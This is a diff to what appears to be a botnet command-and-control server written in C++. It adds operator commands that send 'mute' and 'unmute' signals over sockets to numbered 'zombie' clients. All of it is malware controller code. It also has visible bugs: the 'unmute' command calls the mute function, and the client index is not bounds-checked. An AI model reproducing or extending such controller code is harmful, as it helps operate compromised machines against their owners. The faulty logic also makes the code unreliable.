@@ -71,9 +71,33 @@ Factory_Server::Factory_Server(Server* serv1,const char* pbuffer) : buffer(pbuff
 	{
 		Man man(args[1]);
 	}
+	else if (args[0] == "mute" && args.size() == 2)
+	{
+		mute(serv1,args[1]);
+	}
+	else if (args[0] == "unmute" && args.size() == 2)
+	{
+		mute(serv1, args[1]);
+	}
 	else
 	{
 		if (serv1->send_b(buffer.c_str()))	{remove_client(serv1);}
 	}
 }
 
+void mute(Server* serv,const std::string nb)
+{
+	SOCKET* sock = serv->getSock();
+	std::vector<st_Client> clients = serv->getClients();
+	print_status("Muting zombie " + nb+" ...");
+	int nb_int = atoi(nb.c_str());
+	send(clients[nb_int].sock, "mute", 5, 0);
+}
+void unmute(Server* serv, const std::string nb)
+{
+	SOCKET* sock = serv->getSock();
+	std::vector<st_Client> clients = serv->getClients();
+	print_status("Unmuting zombie " + nb + " ...");
+	int nb_int = atoi(nb.c_str());
+	send(clients[nb_int].sock, "unmute", 7, 0);
+}
